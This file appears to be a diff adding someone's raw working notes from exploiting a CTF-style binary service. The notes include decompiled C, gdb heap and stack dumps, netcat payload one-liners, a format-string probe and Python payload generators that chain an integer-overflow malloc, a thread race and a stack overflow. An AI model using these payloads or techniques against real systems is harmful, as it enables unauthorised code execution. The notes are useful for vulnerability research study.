@@ -1,0 +1,673 @@
+thinking.txt
+
+the environment variable 
+SPAGHETTI_SETUP_COMMAND
+runs a command on start up
+
+
+
+on the first byte sent
+
+if ( s[0] <= 'c' )
+
+make s[0] many threads
+
+printf '\x06\x00\xff\x10' | nc localhost 24242
+
+make 6 threads
+processing 127.0.0.1:4351 <-- \xff\x10
+
+
+need to deal with this bit's foolery
+
+int output(char *format, ...)
+{
+  unsigned __int16 v1; // ax@1
+  va_list va; // [sp+24h] [bp+Ch]@1
+
+  va_start(va, format);
+  v1 = pthread_self();
+  printf("%s %04x ", "MOMS_SPAGHETTI", v1);
+  return vprintf(format, va);
+}
+hmmmm
+
+
+
+struct sockaddr {
+    unsigned short    sa_family;    // address family, AF_xxx
+    char              sa_data[14];  // 14 bytes of protocol address
+};
+
+
+
+0xf7dea2f0:	0xf7deab40f7400010	0xff100002f7dea358
+0xf7dea300:	0x000000000100007f	0x0000000500000000
+
+
+
+nc -l -p blah
+
+
+    v3 = recv(fd, s, 8u, 0);
+      if ( v3 == 8 )
+
+
+
+
+need to send it 8
+
+
+first 4 bytes need to be 1
+first 8 bytes need to be < 0x40000000
+
+
+
+buf = (int)malloc(n + 8);
+need n to be giganormous
+so that it overflows +8 and mallocs a small area
+
+
+so that 
+if ( sock_recv(fd, bufa, n) )
+reads in heaps 
+
+
+0xf7400468:	0x44434241	0x48474645
+
+
+0x4847464544434241
+
+
+
+
+moving into buf
+0xf7400478:	0x44434241	0x00000000	0x00000000	0x00000000
+0xf7400488:	0x00000000	0x00020b79	0x00000000	0x00000000
+
+
+
+CD is like an internal pointer
+
+
+
+
+
+
+=> 0x804920d <process_host+507>:	push   eax
+   0x804920e <process_host+508>:	push   DWORD PTR [ebp-0x14]
+   0x8049211 <process_host+511>:	push   DWORD PTR [ebp-0xc]
+   0x8049214 <process_host+514>:	call   0x8048e37 <process_request>
+
+
+arg[0]: 0x5  #fd
+arg[1]: 0xf74048c3 --> 0x0  # bufa + 'CD'
+arg[2]: 0x48474645 ('EFGH') 
+
+
+
+
+
+
+
+
+
+    memset(bytesRead, 0, 8u);
+      numBytesRead = recv(fd, bytesRead, 8u, 0);
+      if ( numBytesRead == 8 )
+      {
+        if ( *(_WORD *)bytesRead == 1 )         // BA = 00 01
+        {
+          if ( *((_DWORD *)bytesRead + 1) <= 0x40000000u )// HGFE <= 0x40000000
+          {
+            n = *((_DWORD *)bytesRead + 1) + *((_WORD *)bytesRead + 1);// = HGFE + DC
+            buf = (int *)malloc(n + 8);         // 8 + CD + EFGH
+            if ( buf )
+            {
+              v1 = *((_DWORD *)bytesRead + 1);
+              *buf = *(_DWORD *)bytesRead;
+              buf[1] = v1;
+              free(bytesRead);
+              bytesRead = buf;                  // abcdefgh01234567
+              bufa = buf + 2;                   //         01234567
+              if ( sock_recv(fd, bufa, n) )     // read EFGH+CD much into bufa
+                output("[thread] failed to read %i bytes\n", n);
+              buf = (int *)((char *)bufa + *((_WORD *)bytesRead + 1));// bufa + CD
+              process_request(fd, (int)buf, *((_DWORD *)bytesRead + 1));
+              sock_send(fd, " DONE", 5u);
+            }
+            else
+
+
+
+
+v11 = parse_opcode((int)mem, memSize, (int)&s, 256);
+
+
+=> 0x8048d6e <parse_opcode+16>:	call   0x8048cca <decode_length>
+   0x8048d73 <parse_opcode+21>:	add    esp,0x10
+   0x8048d76 <parse_opcode+24>:	mov    DWORD PTR [ebp-0x10],eax
+   0x8048d79 <parse_opcode+27>:	cmp    DWORD PTR [ebp-0x10],0x0
+   0x8048d7d <parse_opcode+31>:	jne    0x8048d99 <parse_opcode+59>
+Guessed arguments:
+arg[0]: 0xf7400488 ("ABCDEFGHIJKLMNOP")
+arg[1]: 0xf7dea1c8 --> 0xab40 
+arg[2]: 0xf7fb2000 --> 0x18e98 
+
+
+
+(printf '\x01\x00\x08\x00\x10\x00\x00\x0001234567\x82BCDEFGHIJKLMNOP';cat) | nc -klvv -p 4351
+
+x82
+
+the right nibble of that 
+tellls how many opcodes to use
+
+
+
+ (printf '\x01\x00\x08\x00\x10\x00\x00\x0001234567\x04HintBCDEFGHIJKLMNOP';cat) | nc -klvv -p 4351
+
+
+
+ '\x01\x00<CD><EFGH><CD_many_things><EFGH_many_things>'
+
+
+{<EFGH_many_things>} = 
+	<X><X_many_things> for X < 0x80
+	or
+	<0xmn><n_many_things><int(n1,n2,n3,n4)_many_things> for m = 8 , n = 1,2,3,4
+
+00ff == 256
+
+
+
+ '\x01\x00\x08\x00\x10\x00\x00\x0012345678\x0cECHO%10x%x%xaaa'
+
+
+try the -1 malloc on server
+
+
+
+
+
+08
+0000000040
+1073741832
+ffff
+0000000040
+1073807359
+
+
+
+        # returnThing = "0100080003010000414141414141414181010145414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141".decode('hex')
+
+
+
+very interesting
+
+
+
+        returnThing = "0100080003010000414141414141414181010445414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141".decode('hex')
+
+
+Server Said: \x04 INVALID REQUEST!  DONE
+
+fuck yes
+lol no..
+
+
+
+
+
+
+
+
+I'm thinking its a race condition
+
+
+gdb-peda$ x/32wx 0xf6c00400
+0xf6c00400: 0xf6c003f8  0xf6c003f8  0xf6c00400  0xf6c00400
+0xf6c00410: 0xf6c00408  0xf6c00408  0xf6c00410  0xf6c00410
+0xf6c00420: 0xf6c00418  0xf6c00418  0xf6c00420  0xf6c00420
+0xf6c00430: 0xf6c00428  0xf6c00428  0xf6c00430  0xf6c00430
+0xf6c00440: 0x00000000  0x00000000  0x00000000  0x00000000
+0xf6c00450: 0xf7792420  0x00000000  0x00021000  0x00021000
+0xf6c00460: 0x00000000  0x00000015  0x00000000  0x00000000
+0xf6c00470: 0x00000000  0x00020b91  0x00000000  0x00000000
+gdb-peda$ x/32wx 0xf6c00400
+0xf6c00400: 0xf6c003f8  0xf6c003f8  0xf6c00400  0xf6c00400
+0xf6c00410: 0xf6c00408  0xf6c00408  0xf6c00410  0xf6c00410
+0xf6c00420: 0xf6c00418  0xf6c00418  0xf6c00420  0xf6c00420
+0xf6c00430: 0xf6c00428  0xf6c00428  0xf6c00430  0xf6c00430
+0xf6c00440: 0x00000000  0x00000000  0x00000000  0x00000000
+0xf6c00450: 0xf7792420  0x00000000  0x00021000  0x00021000
+0xf6c00460: 0x00000000  0x00000015  0x00010001  0x00000002
+0xf6c00470: 0x00000000  0x00020b91  0x00000000  0x00000000
+
+
+
+
+
+
+
+next plan
+
+fuck up this shit
+0xf6c00480: 0x00000000  0x00020b81
+
+
+
+
+
+New game plan
+
+
+run 2 threads
+tell the thing to expect some data and then make them wait
+      numBytesRead = recv(fd, bytesRead, 8u, 0);
+      if ( numBytesRead == 8 )
+      {
+        if ( *(_WORD *)bytesRead == 1 )         // BA = 00 01 unsigned
+        {
+          if ( *((_DWORD *)bytesRead + 1) <= 0x40000000u )// HGFE <= 0x40000000 unsigned
+          {
+            n = *((_DWORD *)bytesRead + 1) + *((_WORD *)bytesRead + 1);// = HGFE + DC
+            buf = (int *)malloc(n + 8);         // 8 + CD + EFGH
+            if ( buf )
+            {
+              v1 = *((_DWORD *)bytesRead + 1);
+              *buf = *(_DWORD *)bytesRead;
+              buf[1] = v1;
+              free(bytesRead);
+              bytesRead = buf;                  // abcdefgh01234567 0-7 == CD section
+              bufa = buf + 2;                   //         01234567
+              if ( sock_recv(fd, bufa, n) )     // read EFGH+CD much into bufa
+
+
+you can hold program execution at the sock_recv and recv
+
+
+
+
+practice manually fucking shit up
+
+just before the malloc write to everywhere it will use
+
+
+
+wtf happens here?
+=> 0x8049201 <process_host+495>:  add    DWORD PTR [ebp-0x14],eax
+
+
+omg getting excited agian
+
+I need to give small efgh and cd == about 3 to make buf that other thing in memorry maybe
+
+
+what if I had 4 CDs! and 0 efgh
+
+0xf6c00480: 0x00450141  0x00020b81
+
+
+
+process_request(int fd, void *mem, int memSize)
+process_request(int fd, &weirdShit, 0)
+
+
+
+this is fucking glorious
+
+
+
+0x8048d6e <parse_opcode+16>:  call   0x8048cca <decode_length>
+
+
+0x00020b81
+that
+
+
+omg omg omg
+
+   if ( *(_DWORD *)opLen <= (unsigned int)theRestLen )// unsigned
+    {
+      if ( *(_DWORD *)opLen + 1 <= stackBufLen )// signed
+
+
+it's unsigned
+so it's all sweet as
+
+the signed one should be fine too
+
+
+   if ( *(_DWORD *)opLen <= (unsigned int)theRestLen )// unsigned
+    {
+      if ( *(_DWORD *)opLen + 1 <= stackBufLen )// signed
+      {
+        opsLeft = *(_DWORD *)opLen;
+        while ( 1 )
+        {
+          v7 = opsLeft--;
+          if ( v7 <= 0 )
+            break;
+          v9 = *(_BYTE *)theRest;
+          if ( v9 == -128 )
+            return 0;
+          v5 = stackBuf++;
+          v6 = theRest++;
+          *(_BYTE *)v5 = *(_BYTE *)v6;
+
+then it does the copy
+
+I should be able to malloc something directly after my little block
+and then copy whatever I like into stackbuf
+
+
+if opLen is ffff
+then oplen +1 will be 0 which is less than stackBuffLen
+that lets me overflow stackbuff
+
+I'll also need to coordinate another thread to park some data in the heap there
+
+
+
+
+
+k so turns out that you could get anything this way
+which is good news
+
+I'll spam a bunch of threads
+
+at the start of each thread I'll put the payload I want for the opcode thing
+
+84ffffffff
+
+with that payload len theRestLen will be
+-5
+
+ff -1
+fe -2
+fd -3
+fc -4
+fb -5 <- that
+
+when I did it with my fluke bytes I got
+0xfffffffe
+so with my crafted payload I'll get
+0xfffffffb
+
+need oplen to be less that that
+so the payload will have to be 
+
+84fffffffc at a max, which is a pretty generous upper limmit
+
+at a minimum it has to be <max signed int-1>
+
+
+
+7b40
+
+      if ( v9 == 0x80u )
+            return 0;
+
+the hacking gods are in my favour
+also I can put an 0x80 in shit and bail early once I've done the payload
+
+
+
+
+    def generateResponse(self):
+
+
+        opcodeData = self.opcodeData("E")
+        CD = 2
+        CD += self.num*4
+        # EFGH = len(opcodeData)
+        EFGH = 0
+        returnThing = "\x01\x00" # version 
+        returnThing += p16(CD+2) 
+        returnThing += p32(EFGH) 
+        returnThing += "\x01T"
+        returnThing += "\x80" * CD
+        # returnThing += opcodeData
+        # print returnThing.encode('hex')
+
+        return returnThing
+
+
+Server Said: T 57DEA1B2 DONE
+
+
+using the "\x01T" left over from another use! woo
+
+
+
+    def generateResponse(self):
+
+
+        opcodeData = self.opcodeData("E")
+        # CD = 0
+        if self.num %2 == 0:
+            CD = self.num*4
+            # EFGH = len(opcodeData)
+            EFGH = 0
+            returnThing = "\x01\x00" # version 
+            returnThing += p16(5 + 13*4 + CD) 
+            returnThing += p32(EFGH) 
+            returnThing += "\x81\xff\xff\xff\xfa" # load big oplen for other thread
+            returnThing += "A"*4
+            returnThing += "B"*4
+            returnThing += "C"*4
+            returnThing += "D"*4
+            returnThing += "E"*4        # stack overridding 
+            returnThing += "F"*4
+            returnThing += "G"*4
+            returnThing += "H"*4
+            returnThing += "I"*4
+            returnThing += "J"*4
+            returnThing += "K"*4
+            returnThing += "L"*4
+            returnThing += "\x80"*4 # stop coppying
+            returnThing += "A" * CD
+            # returnThing += opcodeData
+            # print returnThing.encode('hex')
+            return returnThing
+
+        else:
+            CD = self.num*4
+            # EFGH = len(opcodeData)
+            EFGH = 0
+            returnThing = "\x01\x00" # version 
+            returnThing += p16(CD) 
+            returnThing += p32(EFGH) 
+            returnThing += "A" * CD
+            # returnThing += opcodeData
+            # print returnThing.encode('hex')
+
+            return returnThing
+
+
+
+
+
+#theBestXD
+    def generateResponse(self):
+
+
+        opcodeData = self.opcodeData("E")
+        # CD = 2
+        CD = self.num
+        # EFGH = len(opcodeData)
+        EFGH = 0
+        returnThing = "\x01\x00" # version 
+        returnThing += p16(CD*4) 
+        returnThing += p32(EFGH) 
+        returnThing += "\x01T\x01T"*CD
+        # returnThing += "\x80" * CD
+        # returnThing += opcodeData
+        # print returnThing.encode('hex')
+
+        return returnThing
+
+
+
+copy_length + 1 > output_buffer_size
+
+yay it works
+nay it's hitting the thing
+
+thinking send one then two and hold on the first recv
+release 2 first so that it lines up
+
+
+
+pause A till B leaves
+
+
+0xf6200460: 0x00000000  0x00000015  0x00000000  0x00000000
+0xf6200470: 0x00000000  0x00000015  0x00040001  0x00000000
+0xf6200480: 0x42424242  0x00020b81  0x00000000  0x00000000
+
+
+
+continue..
+
+0xf6200460: 0x00000000  0x00000015  0x00000000  0x00000000
+0xf6200470: 0x00000000  0x00000015  0xf6200460  0x00000000
+0xf6200480: 0x42424242  0x00020b81  0x00000000  0x00000000
+
+
+0xf6200440: 0x00000000  0x00000000  0x00000000  0x00000000
+0xf6200450: 0xf6400010  0x00000000  0x00021000  0x00021000
+0xf6200460: 0x00000000  0x00000015  0x00040001  0x00000000
+0xf6200470: 0x00000000  0x00020b91  0x00000000  0x00000000
+0xf6200480: 0x00000000  0x00000000  0x00000000  0x00000000
+
+
+
+
+
+
+
+12 rows
+6 blocks
+3 extra
+
+100 + 3 + 4*6 + 4*4*12
+
+
+0xf59fe230: 0x41414141  0x41414141  0x41414141  0x41414141
+0xf59fe240: 0x00000041  0x00000000  0x00000000  0x00000000
+0xf59fe250: 0x00000000  0x00000000  0x00000000  0x00000000
+0xf59fe260: 0x00000000  0x00000000  0x00000000  0x00000000
+0xf59fe270: 0x00000000  0x00000000  0x00000000  0x00000000
+0xf59fe280: 0x00000000  0x00000000  0x00000000  0x00000000
+0xf59fe290: 0x00000000  0x00000000  0x00000000  0x00000000
+0xf59fe2a0: 0x00000000  0x00000000  0x00000000  0x00000000
+0xf59fe2b0: 0x00000000  0x00000000  0x00000000  0x00000000
+0xf59fe2c0: 0x00000000  0x00000000  0x00000000  0x00000000
+0xf59fe2d0: 0x00000000  0x00000000  0x00000000  0x00000000
+0xf59fe2e0: 0x00000000  0x00000000  0x00000000  0x00000000
+0xf59fe2f0: 0x00000000  0x00000000  0x00000000  0x00000000
+0xf59fe300: 0x0100007f  0x00000000  0x00000006  0x00000006
+0xf59fe310: 0x00000000  0xf59feb40  0xf59fe358  0x08049219
+
+
+
+
+
+0xec3f0200: 0x41414141  0x020b7941  0x65000100  0x00000001
+0xec3f0210: 0xffff8100  0x4141faff  0x41414141  0x41414141
+0xec3f0220: 0x41414141  0x41414141  0x41414141  0x41414141
+0xec3f0230: 0x41414141  0x41414141  0x41414141  0x41414141
+0xec3f0240: 0x00000041  0x00000000  0x00000000  0x00000000
+0xec3f0250: 0x00000000  0x00000000  0x00000000  0x00000000
+0xec3f0260: 0x00000000  0x00000000  0x00000000  0x00000000
+0xec3f0270: 0x00000000  0x00000000  0x00000000  0x00000000
+0xec3f0280: 0x00000000  0x00000000  0x00000000  0x00000000
+0xec3f0290: 0x00000000  0x00000000  0x00000000  0x00000000
+0xec3f02a0: 0x00000000  0x00000000  0x00000000  0x00000000
+0xec3f02b0: 0x00000000  0x00000000  0x00000000  0x00000000
+
+
+
+why the fuck are they leaving!
+
+        opsLeft = *(_DWORD *)opLen;
+        while ( 1 )
+        {
+          v7 = opsLeft--;
+          if ( v7 <= 0 )
+            break;
+          v9 = *(_BYTE *)theRest;
+          if ( v9 == 0x80u )
+            return 0;
+          v5 = stackBuf++;
+          v6 = theRest++;
+          *(_BYTE *)v5 = *(_BYTE *)v6;
+        }
+        result = *(_DWORD *)opLen;
+      }
+      else
+      {
+
+
+
+8048E30
+
+A block is likely to get the same as a previous block so I should set up
+one thats like 
+
+
+
+Junk
+Junk
+Junk
+Goodshit
+
+and then malloc a spot so that it fits in 
+
+payloads = [
+    "A"*128 + "\x81\x00\x00\x02\xff" + '\xff'*(128 + 3 + 4*6 + 4*4*12) + "CCCC",
+    "B"*(128)
+]
+
+becomes:
+
+payloads = [
+    "A"*128 + "\x84\x00\x00\x02\xff" + '\xff'*(128 + 3 + 4*6 + 4*4*12) + "CCCC",
+    "B"*(128)
+]
+
+
+lol
+
+
+0x1ffff7f
+
+    "A"*(126) + "\x84\x7f\xff\xff\xff" + 'A'*10 + "0x80",
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
